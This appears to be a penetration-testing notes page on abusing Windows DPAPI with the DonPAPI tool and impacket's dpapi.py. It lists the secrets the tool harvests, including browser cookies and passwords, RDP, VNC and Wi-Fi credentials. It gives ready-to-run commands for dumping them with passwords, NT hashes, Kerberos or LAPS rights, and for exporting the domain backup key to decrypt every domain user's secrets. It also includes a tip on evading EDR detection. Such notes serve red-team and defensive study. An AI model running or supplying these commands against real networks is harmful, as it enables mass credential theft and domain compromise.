---
title: "DPAPI abuse"
date: 2020-07-16T13:41:37+02:00
draft: false
---
asdas

#### DPAPI abuse using DonPAPI
Reference: https://github.com/login-securite/DonPAPI

##### Currently gathered information
* Windows credentials (Taskscheduled credentials & a lot more)
* Windows Vaults
* Windows RDP credentials
* AdConnect (still require a manual operation)
* Wifi key
* Intenet explorer Credentials
* Chrome cookies & credentials
* Firefox cookies & credentials
* VNC passwords
* mRemoteNG password (with default config)

##### Example usage
Dump all secrets of the target machine with an admin account : 

```bash
DonPAPI.py domain/user:passw0rd@target
```

Using user's hash

```bash
DonPAPI.py --hashes <LM>:<NT> domain/user@target
```

Using kerberos (-k) and local auth (-local_auth)

```bash
DonPAPI.py -k domain/user@target
DonPAPI.py -local_auth user@target
```

Using a user with LAPS password reading rights

```bash
DonPAPI.py -laps domain/user:passw0rd@target
```

It is also possible to provide the tool with a list of credentials that will be tested on the target. DonPAPI will try to use them to decipher masterkeys.

This credential file must have the following syntax:

```plain
user1:pass1
user2:pass2
...
```

```bash
DonPAPI.py -credz credz_file.txt domain/user:passw0rd@target
```

When a domain admin user is available, it is possible to dump the domain backup key using impacket `dpapi.py` tool. 

```bash
dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
```

This backup key (pvk file) can then be used to dump all domain user's secrets!

`python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list`

Target can be an IP, IP range, CIDR, file containing list targets (one per line)


##### Opsec consideration
The RemoteOps part can be spoted by some EDR. It can be disabled using `--no_remoteops` flag, but then the machine DPAPI key won't be retrieved, and scheduled task credentials/Wi-Fi passwords won't be harvested. 

****